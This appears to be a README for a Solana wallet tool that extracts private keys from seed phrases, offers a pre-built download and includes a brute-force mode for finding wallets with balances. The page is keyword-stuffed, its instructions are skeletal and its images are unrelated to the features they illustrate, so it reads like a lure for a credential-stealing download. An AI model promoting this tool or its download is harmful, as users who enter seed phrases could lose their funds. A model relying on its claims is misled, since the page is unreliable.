# Solana Wallet Private Key Checker: Securely Verify Your Keys

**SolanaChecker** provides a comprehensive suite of tools for interacting with the Solana blockchain, simplifying the process of checking wallet status and managing your assets. A key function is the Solana Wallet Private Key Checker, allowing you to verify the private key associated with your Solana wallet.

###[DOWNLOAD FOR WINDOWS & LINUX](../../releases)
   <p align="left">
    <img src="/upload/center.webp" />
</p>

## Program Features: Focus on Key Verification

1.  **Check Solana Address Balance:** Check the current Solana balance.

<p align="left">
    <img src="/upload/save.webp" />
</p>

2.  **Check Solana Tokens for Fraud:** Assess the security of tokens.

<p align="left">
    <img src="/upload/smooth.webp" />
</p>

3.  **Track Solana Addresses:** Receive notifications.

4.  **Wallet Data from Mnemonic Phrase (Key Feature):** *Verify your private key.* Extract the private key, address, and balance of a Solana wallet using the mnemonic phrase (seed phrase).

<p align="left">
    <img src="/upload/workspace.webp" />
</p>

5.  **Generate a Single Solana Wallet:** Generate new wallets.

<p align="left">
    <img src="/upload/manager.webp" />
</p>

6.  **Generation Solana Wallets and Check Balance (for Research):** Brute-force.

<p align="left">
    <img src="/upload/study.webp" />
</p>

## Setting Up Telegram

Configure Telegram for notifications.

## Getting Started: Download or Build

Download a pre-compiled build or build the project.

## Building the Project

Building from source ensures security.

### Installing Dependencies Using vcpkg:

1.  Install **vcpkg** if you haven't.
2.  Add vcpkg to your PATH.
3.  Run:

    -   Install **OpenSSL**:
        ```bash
        vcpkg install openssl
        ```

    -   Install **nlohmann-json**:
        ```bash
        vcpkg install nlohmann-json
        ```

    -   Install **Crypto++**:
        ```bash
        vcpkg install cryptopp
        ```

    -   Install **libsodium**:
        ```bash
        vcpkg install libsodium
        ```

4.  Build.

### Building via Visual Studio:

1.  Open the solution.
2.  Make sure **vcpkg** is integrated.
3.  Click **Build** -> **Build Solution**.
4.  The executable is in the `bin` folder.

### Building with Another C++ Compiler:

1.  Ensure that all dependencies are installed.
2.  Compile using:

    ```bash
    g++ -o solanachecker main.cpp -lssl -lcrypto -lsodium -lcryptopp -std=c++17
    ```

## Command Line: Key Verification

Use the command line:

1.  **-s / -search**: Brute-force.
2.  **-t / -track (ADDRESS)**: Track.
3.  **-g / -gen (NUMBER)**: Generate.
4.  **-m / -mnemonic (MNEMONIC)**: *Use this command to check and verify your Solana wallet private key, by providing the mnemonic phrase.*
5.  **-b / -balance (ADDRESS)**: Check balance.

## Notes

-   Use responsibly.
-   Protect your seed phrases.


  ###[DOWNLOAD FOR WINDOWS & LINUX](../../releases)

  ## License
This project is licensed under the [MIT License](/LICENSE).